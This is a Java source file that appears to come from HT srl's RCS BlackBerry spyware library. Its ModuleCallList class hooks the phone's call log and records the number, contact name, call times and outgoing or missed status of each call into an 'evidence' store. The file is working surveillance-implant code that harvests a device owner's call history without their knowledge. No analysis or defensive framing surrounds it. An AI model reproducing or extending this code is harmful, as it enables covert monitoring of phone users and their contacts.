//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : CallListAgent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.module;

import java.util.Date;

import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.CallListObserver;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;

/**
 * The Class CallListAgent.
 */
public final class ModuleCallList extends BaseModule implements CallListObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("CallListAgent", DebugLevel.VERBOSE);
    //#endif

    /**
     * Instantiates a new call list agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public ModuleCallList(final boolean agentEnabled) {
        super(BaseModule.AGENT_CALLLIST, agentEnabled, Conf.AGENT_CALLIST_ON_SD, "CallListAgent");

    }

    /**
     * Instantiates a new call list agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ModuleCallList(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualStart() {
        AppListener.getInstance().addCallListObserver(this);
    }

    public void actualStop() {
        AppListener.getInstance().removeCallListObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualGo() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {

        return false;
    }

    public void callLogAdded(String number, String name, Date date,
            int duration, boolean outgoing, boolean missed) {
        //#ifdef DEBUG
        debug.info("number: " + number + " date: " + date + " duration: "
                + duration + " outgoing: " + outgoing + " missed: " + missed);
        //#endif

        final String nametype = "u";
        final String note = "no notes";

        //#ifdef DBC
        Check.requires(number != null, "callLogAdded null number");
        Check.requires(name != null, "callLogAdded null name");
        Check.requires(nametype != null, "callLogAdded null nametype");
        Check.requires(note != null, "callLogAdded null note");
        //#endif

        final int LOG_CALLIST_VERSION = 0;

        int len = 28; //0x1C;

        len += wsize(number);
        len += wsize(name);
        len += wsize(note);
        len += wsize(nametype);

        final byte[] data = new byte[len];

        final DataBuffer databuffer = new DataBuffer(data, 0, len, false);

        final DateTime from = new DateTime(date);
        final DateTime to = new DateTime(new Date(date.getTime() + duration
                * 1000));

        databuffer.writeInt(len);
        databuffer.writeInt(LOG_CALLIST_VERSION);
        databuffer.writeLong(from.getFiledate());
        databuffer.writeLong(to.getFiledate());

        final int flags = (outgoing ? 1 : 0) + (missed ? 0 : 6);
        databuffer.writeInt(flags);

        //#ifdef DBC
        Check.asserts(databuffer.getLength() == len,
                "callLogAdded: wrong len: " + databuffer.getLength());
        //#endif

        Utils.addTypedString(databuffer, (byte) 0x01, name);
        Utils.addTypedString(databuffer, (byte) 0x02, nametype);
        Utils.addTypedString(databuffer, (byte) 0x04, note);
        Utils.addTypedString(databuffer, (byte) 0x08, number);

        evidence.atomicWriteOnce(getAdditionalData(), databuffer.getArray());

    }

    private int wsize(String string) {
        if (string.length() == 0) {
            return 0;
        } else {
            return string.length() * 2 + 4;
        }
    }

    private byte[] getAdditionalData() {
        return null;
    }

}
